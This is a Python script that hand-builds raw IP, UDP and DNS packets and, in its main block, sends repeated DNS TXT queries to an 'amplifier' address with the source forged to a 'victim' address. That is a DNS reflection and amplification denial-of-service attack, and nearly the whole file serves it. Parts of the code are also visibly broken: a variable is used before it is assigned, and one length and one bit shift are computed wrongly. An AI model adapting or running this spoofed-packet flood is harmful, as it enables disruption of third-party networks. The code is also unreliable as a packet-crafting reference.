from enum import Enum
import random
import socket
import struct
import functools

class QTYPE(Enum):
    A       = 1
    AAAA    = 28
    CNAME   = 5
    MX      = 15
    NS      = 2
    SOA     = 6
    TXT     = 16


def compute_checksum(msg):
    checksum = 0
    for i in range(0, len(msg), 2):
        if (i + 1) == len(msg):
            checksum += msg[i]
        else:
            checksum += msg[i] + (msg[i + 1] << 8)

    checksum = (checksum & 0xFFFF) + (checksum >> 16)
    checksum = ~checksum & 0xFFFF

    return checksum


def pack_ip_packet(**kwargs):
    """
    version - ihl   : B  (1 byte)
    dscp - ecn      : B  (1 byte)
    total length    : H  (2 bytes)
    identification  : H  (2 bytes)
    flags - offset  : H  (2 bytes)
    ttl             : B  (1 byte)
    protocol        : B  (1 byte)
    header checksum : H  (2 bytes)
    source address  : 4s (4 bytes)
    dest address    : 4s (4 bytes)

    References:
        https://www.tutorialspoint.com/ipv4/ipv4_packet_structure.htm
    """

    version_ihl = (kwargs["version"] << 4) | kwargs["ihl"]
    dscp_ecn = (kwargs["dscp"] << 7) | kwargs["ecn"]
    flags_offset = (kwargs["flags"] << 13) | kwargs["fragment_offset"]

    return struct.pack("!BBHHHBBH4s4s",
        version_ihl,
        dscp_ecn,
        kwargs["total_length"],
        kwargs["identification"],
        flags_offset,
        kwargs["time_to_live"],
        kwargs["protocol"],
        kwargs["checksum"],
        kwargs["src_addr"],
        kwargs["dest_addr"]
    )


def pack_udp_packet(**kwargs):
    """
    src port    : H (2 bytes)
    dest port   : H (2 bytes)
    length      : H (2 bytes)
    checksum    : H (2 bytes)
    """

    return struct.pack("!HHHH",
        kwargs["src_port"],
        kwargs["dest_port"],
        kwargs["length"],
        kwargs["checksum"]
    )

def pack_dns_header(**kwargs):
    """
    id      : H (2 bytes)
    qr      : 1 bit
    opcode  : 4 bits
    aa      : 1 bit
    tc      : 1 bit
    rd      : 1 bit
    ra      : 1 bit
    z       : 3 bits
    rcode   : 4 bits
    qdcount : H (2 bytes)
    ancount : H (2 bytes)
    nscount : H (2 bytes)
    arcount : H (2 bytes)

    qname   : str
    qtype   : QTYPE

    References:
        https://www2.cs.duke.edu/courses/fall16/compsci356/DNS/DNS-primer.pdf
        https://routley.io/posts/hand-writing-dns-messages/
    """

    second_row = \
        (kwargs["qr"] << 15) | \
        (kwargs["opcode"] << 11) | \
        (kwargs["aa"] << 10) | \
        (kwargs["tc"] << 9) | \
        (kwargs["rd"] << 8) | \
        (kwargs["ra"] << 7) | \
        (kwargs["z"] << 4) | \
        (kwargs["rcode"])

    return struct.pack("!HHHHHH",
        kwargs["id"],
        second_row,
        kwargs["qdcount"],
        kwargs["ancount"],
        kwargs["nscount"],
        kwargs["arcount"]
    )


def pack_dns_query(**kwargs):
    """
    qname   : str
    qtype   : QTYPE
    """

    labels = kwargs["qname"].split('.')
    sections = functools.reduce(
        lambda acc, cur: f"{acc}{chr(len(cur))}{cur}",
        labels,
        ""
    )
    qclass = 0x0001 # internet class

    return bytes(f"{sections}\x00", "utf-8") + struct.pack("!HH", kwargs["qtype"].value, qclass)


def make_ip_packet(**kwargs):
    """
    required fields in kwargs:
        src_addr
        dest_addr
        payload
    """
    payload = bytes(kwargs["payload"])

    fields = {
        "version": 4,
        "ihl": 5,
        "dscp": 0,
        "ecn": 0,
        "total_length": 20 + len(payload),
        "identification": random.randint(0, 65535),
        "flags": 0,
        "fragment_offset": 0,
        "time_to_live": 128,
        "protocol": socket.IPPROTO_UDP,
        "checksum": 0,
        "src_addr": socket.inet_pton(socket.AF_INET, kwargs["src_addr"]),
        "dest_addr": socket.inet_pton(socket.AF_INET, kwargs["dest_addr"])
    }

    preflight_packet = pack_ip_packet(**fields)
    fields["checksum"] = compute_checksum(preflight_packet)

    return pack_ip_packet(**fields)

def make_udp_packet(**kwargs):
    """
    required fields in kwargs:
        src_port
        dest_port
        payload
    """
    payload = bytes(kwargs["payload"])

    fields = {
        "src_port": kwargs["src_port"],
        "dest_port": kwargs["dest_port"],
        "length": 8 + len(payload),
        "checksum": 0 # checksum is optional in UDP
    }

    return pack_udp_packet(**fields)


def make_dns_packet(**kwargs):
    """
    required fields in kwargs:
        qname
        qtype
    """

    header_fields = {
        "id": random.randint(0, 65535),
        "qr": 0,        # is it a response?
        "opcode": 0,    # 0 for a standard query
        "aa": 0,        # only meaningful in response
        "tc": 0,        # is the mssage truncated?
        "rd": 1,        # use recursion?
        "ra": 0,        # is recursion available?
        "z": 0,         # for future use
        "rcode": 0,     # response code
        "qdcount": 1,   # # of questions
        "ancount": 0,
        "nscount": 0,
        "arcount": 0,
    }

    query_fields = {
        "qname": kwargs["qname"],
        "qtype": kwargs["qtype"]
    }

    return pack_dns_header(**header_fields) + pack_dns_query(**query_fields)


def make_dns_query(**kwargs):
    """
    required fields in kwargs:
        src_addr
        dest_addr
        src_port
        dest_port
        qname
        qtype
    """

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

    # include ip header
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    udp_packet = make_udp_packet(src_port=kwargs["src_port"], dest_port=kwargs["dest_port"], payload=dns_packet)
    ip_packet = make_ip_packet(src_addr=kwargs["src_addr"], dest_addr=kwargs["dest_addr"], payload=udp_packet)
    dns_packet = make_dns_packet(qname=kwargs["qname"], qtype=kwargs["qtype"])

    return sock.sendto(ip_packet + udp_packet + dns_packet, (kwargs["dest_addr"], kwargs["dest_port"]))


if __name__ == "__main__":
    ADDRS = {
        "victim": "192.168.30.1",
        "amplifier": "192.168.20.1",
        "attacker": "192.168.10.1"
    }

    for _ in range(15):
        make_dns_query(
            src_addr=ADDRS["victim"],
            dest_addr=ADDRS["amplifier"],
            src_port=5000,
            dest_port=53,
            qname="live.com",
            qtype=QTYPE.TXT
        )
